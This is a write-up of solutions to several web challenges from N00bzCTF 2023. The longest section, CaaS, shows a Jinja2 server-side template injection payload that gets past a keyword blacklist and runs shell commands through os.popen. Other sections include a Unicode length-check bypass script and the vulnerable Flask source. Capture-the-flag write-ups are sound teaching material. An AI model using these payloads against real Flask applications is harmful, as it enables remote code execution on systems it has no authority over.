# Write up N00bzCTf 2023

## Club_N00b
For the first few challs, I will upload the payload and quickly skim through it because it is a blackbox.
![](https://hackmd.io/_uploads/HJU8lz7Dh.png)
Note that `radical` is mentioned here. 
Try using the Check Status function with a parameter called secret_phrase set to nope. Just replace it with radical and you'll get the flag
![](https://hackmd.io/_uploads/BkimWfmv2.png)

## Robots
The name of the task immediately makes me think of a file [robots.txt](https://fptcloud.com/file-robots-txt/)
![](https://hackmd.io/_uploads/rJk_-fXP2.png)

Just change the path and it's okay.
![](https://hackmd.io/_uploads/Hyd1QzmD2.png)

## Secret Group
When accessing the website, you receive an agent that is not n00bz-4dm1n, I immediately think chall will check the HTTP header.
![](https://hackmd.io/_uploads/BJgGQzXDh.png)

Just modify the components in the sent request and you will get the flag.

![](https://hackmd.io/_uploads/HkSyEMmD3.png)

## Conditions

![](https://hackmd.io/_uploads/BybmNfmDh.png)

"We have a feature to input username, and the author's provided us with the source code:
```python
@app.route('/login',methods=['GET','POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        if len(request.values["username"]) >= 40:
            return render_template_string("Username is too long!")
        elif len(request.values["username"].upper()) <= 50:
            return render_template_string("Username is too short!")
        else:
            return flag
```

After inputting the username:
- The first if statement checks if the length of the username is greater than or equal to 40, then it will return "too long".
- Next, if username.upper() <= 50, then it will return "too short"."
![](https://hackmd.io/_uploads/H1u4HGmvn.png)
Hmm, if we input a normal string, we can't pass both conditions to get the flag. Because upper() is just a function to convert the string to uppercase.
After researching for a while, I found a special character :v
![](https://hackmd.io/_uploads/ByF2SMXvh.png)

Wow :v so we just need to input 49 special characters and 49 * 3 > 50.
Ok, nice.
I'll write a script to send the request and get the flag because BurpSuite is not very good at handling Unicode characters
```python
import requests

url = "http://challs.n00bzunit3d.xyz:42552/login"

r = requests.post(url, data = {"username" : 'ﬃ'*39})
print(r.text)
```
![](https://hackmd.io/_uploads/S1nwLzQv3.png)

## CaaS

### Source code:
```python
#!/usr/bin/env python3
from flask import Flask, request, render_template, render_template_string, redirect
import subprocess
import urllib

app = Flask(__name__)

def blacklist(inp):
    blacklist = ['mro','url','join','attr','dict','()','init','import','os','system','lipsum','current_app','globals','subclasses','|','getitem','popen','read','ls','flag.txt','cycler','[]','0','1','2','3','4','5','6','7','8','9','=','+',':','update','config','self','class','%','#']
    for b in blacklist:
        if b in inp:
            return "Blacklisted word!"
    if len(inp) <= 70:
        return inp
    if len(inp) > 70:
        return "Input too long!"

@app.route('/')
def main():
    return redirect('/generate')

@app.route('/generate',methods=['GET','POST'])
def generate_certificate():
    if request.method == 'GET':
        return render_template('generate_certificate.html')
    elif request.method == 'POST':
        name = blacklist(request.values['name'])
        teamname = request.values['team_name']
        return render_template_string(f'<p>Haha! No certificate for {name}</p>')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=52130)
```
### Idea:
- After looking through the source code, I was quite surprised by the large number of filters and the limit on the number of characters I could input.
- It's quite challenging :v If you play web CTFs, you can probably see that this is an SSTI exploit (the vulnerability is in the render function). To learn more, you can check it out [here](https://secure-cookie.io/attacks/ssti/)
- If we only copy and read the payloads in Payloads All The Things for this task, we will be stuck
![](https://hackmd.io/_uploads/rkgftfQwn.png)
- The goal of the payload is to access the 'os' module to execute commands.
- Because cycler, joiner, and lipsum class are all in the blacklist, we can only use the namespace. If we use this method, the payload will be like this:
`{{namespace['__ini''t__']['__global''s__']['o''s']['pop''en']('l\s')['rea''d'](+)}}`
Around 80-90 characters to execute.
`__init__`   banned so I'm using `['__ini''t__']` to bypass. And `()` trở become `(+)`
So I switched to using [global variables](https://flask.palletsprojects.com/en/2.0.x/templating/) To find gadgets in `__globals__`
![](https://hackmd.io/_uploads/ByGTrmQP3.png)

- I found that the global variable `g` is the shortest, so I decided to use it to build.
### Exploit

You imagine that my payload will look like this
```
name={{g.pop['__global''s__'].__builtins__.eval('__import__("os").popen("id").read()')}}
```
About 83 characters, and now I'll start reducing the number to avoid the blacklist.
In Python, we have several ways to get the input value.
![](https://hackmd.io/_uploads/rJUw_Q7wn.png)

I will use it to insert values into string variables. That's why I used eval. Inside it is a string command, so I can optimize a lot

```
name={{g.pop['__global''s__'].__builtins__.eval(request.form.a)}}
```
And we will add the parameter `a` to the request. :
![](https://hackmd.io/_uploads/HyQbK7Qv3.png)

(The image above is my local test, expanding the number of characters input for testing)

![](https://hackmd.io/_uploads/BJs3tmQP3.png)

Finally, we can RCE on the server to get the flag. We can use commands from the `a` parameter without being checked.

![](https://hackmd.io/_uploads/H1OMc7Xw2.png)

Payload:
```
name={{g.pop['__global''s__'].__builtins__.eval(request.form.a)}}&a=__import__("os").popen("cat flag.txt").read()&team_name=cc
```

Here's the source code for this task if you want to rebuild it(I've adjusted the input length):
- Required: [install flask](https://pypi.org/project/Flask/)
```python
#!/usr/bin/env python3
from flask import Flask, request, render_template, render_template_string, redirect
import subprocess
import urllib

app = Flask(__name__)

def blacklist(inp):
    blacklist = ['mro','url','join','attr','dict','()','init','import','os','system','lipsum','current_app','globals','subclasses','|','getitem','popen','read','ls','flag.txt','cycler','[]','0','1','2','3','4','5','6','7','8','9','=','+',':','update','config','self','class','%','#']
    for b in blacklist:
        if b in inp:
            return "Blacklisted word!"
    if len(inp) <= 1000:
        return inp
    if len(inp) > 1000:
        return "Input too long!"
    


@app.route('/generate',methods=['GET','POST'])
def generate_certificate():
    if request.method == 'POST':
        name = blacklist(request.values['name'])
        teamname = request.values['team_name']
        return render_template_string(f"""
                <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>cc</title>
        </head>
        <body>
            <p1> {name} </p1>
        </body>
        </html>
        """,name=name)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=52130)

```



## Thanks
> **Thank you to the author for bringing us such great challenges. We hope that next year will be just as amazing.**
